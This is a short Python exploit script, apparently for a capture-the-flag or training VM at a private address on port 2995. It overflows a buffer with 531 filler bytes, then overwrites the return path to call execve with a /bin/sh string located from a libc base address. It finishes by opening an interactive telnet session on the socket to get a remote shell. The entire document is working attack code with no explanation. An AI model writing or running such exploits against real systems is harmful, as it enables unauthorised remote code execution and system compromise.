import socket
import struct
import os
import sys
import telnetlib
s = socket.socket()
s.connect(("192.168.147.132", 2995))
execve = struct.pack("I", 0x08048c0c)
fake_ret_addr = b"AAAA"
binsh = struct.pack("I",0xb7e97000+0x11f3bf)
payload = b"A" * 531 + b"\x00" + execve + fake_ret_addr + binsh + b"\x00"*4 + b"\x00"*4
s.send(payload+b"\n")

t = telnetlib.Telnet()
t.sock = s
t.interact()
